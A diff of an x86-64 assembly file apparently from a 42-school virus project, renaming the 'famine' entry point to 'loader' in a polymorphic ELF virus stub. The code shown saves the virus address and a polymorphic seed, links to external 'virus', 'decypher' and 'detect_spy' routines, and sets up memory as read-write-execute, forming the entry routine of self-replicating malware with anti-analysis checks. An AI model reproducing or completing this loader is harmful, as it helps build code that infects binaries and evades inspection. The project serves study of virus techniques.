@@ -1,34 +1,31 @@
 ; **************************************************************************** ;
 ;                                                                              ;
 ;                                                         :::      ::::::::    ;
-;    famine.s                                           :+:      :+:    :+:    ;
+;    loader.s                                           :+:      :+:    :+:    ;
 ;                                                     +:+ +:+         +:+      ;
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/12/20 23:34:02 by anselme          ###   ########.fr        ;
+;    Updated: 2019/12/26 21:53:55 by anselme          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
 %define SYSCALL_WRITE		0x01
-%define SYSCALL_EXIT		0x3c
 %define SYSCALL_MPROTECT	0x0a
 %define STDOUT			0x01
 %define PROT_RWX		0x07
 %define CALL_INSTR_SIZE		0x05
-%define SYSCALL_FORK		0x39
 
 section .text
-	global famine_entry
+	global loader_entry
 	global mark_below
 	global return_to_client
 
-extern _start
 extern virus
 extern decypher
 extern detect_spy
 
-famine_entry:
+loader_entry:
 ;------------------------------; Store variables
 	call mark_below
 	db "polymorphic seed", "rel ptld", "ptldsize", "relvirus"
@@ -62,7 +59,7 @@ mark_below:
 	mov r11, [r11]
 	mov r14, [r14]
 
-	mov rax, rdx               ; get famine_entry addr
+	mov rax, rdx               ; get loader_entry addr
 	sub rax, CALL_INSTR_SIZE
 
 	push r15                   ; backup r15
@@ -77,7 +74,7 @@ mark_below:
 	sub r11, r15               ; r11 = rax - r11
 	pop r15                    ; restore r15
 
-	push rax                   ; save famine_entry  [rsp + 40]
+	push rax                   ; save loader_entry  [rsp + 40]
 	push r8                    ; save ptld addr     [rsp + 32]
 	push r9                    ; save ptld size     [rsp + 24]
 	push r10                   ; save virus addr    [rsp + 16]
